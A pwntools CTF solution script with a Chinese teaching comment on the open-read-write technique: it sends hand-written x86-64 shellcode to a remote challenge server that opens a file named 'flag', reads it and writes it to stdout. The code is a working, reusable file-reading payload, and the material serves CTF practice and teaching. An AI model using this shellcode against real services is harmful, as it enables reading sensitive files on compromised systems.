from pwn import *

context(log_level='debug',os='linux',arch='amd64')

p = remote('pwn.challenge.ctf.show',28175)

shellcode = '''
            push 0
            mov r15, 0x67616c66
            push r15
            mov rdi, rsp
            mov rsi, 0
            mov rax, 2
            syscall
            mov r14, 3
            mov rdi, r14
            mov rsi, rsp
            mov rdx, 0xff
            mov rax, 0
            syscall
            mov rdi,1
            mov rsi, rsp
            mov rdx, 0xff
            mov rax, 1
            syscall
            '''

payload = asm(shellcode)

p.sendline(payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ORW - Open Read Write
2. 核心原理：
   - 当无法获取shell时，直接读取flag文件
   - 使用系统调用open、read、write
   - 打开flag文件，读取内容，输出到stdout
3. ORW流程：
   - open("flag", 0)：打开flag文件
   - read(fd, buf, size)：读取文件内容到缓冲区
   - write(1, buf, size)：将内容输出到stdout
4. 实现方式：
   - 手写汇编shellcode
   - 使用pwntools的shellcraft
   - 构造ROP链调用系统调用
5. 应用场景：
   - 远程环境无法反弹shell
   - 题目要求读取特定文件
   - execve被禁用
"""
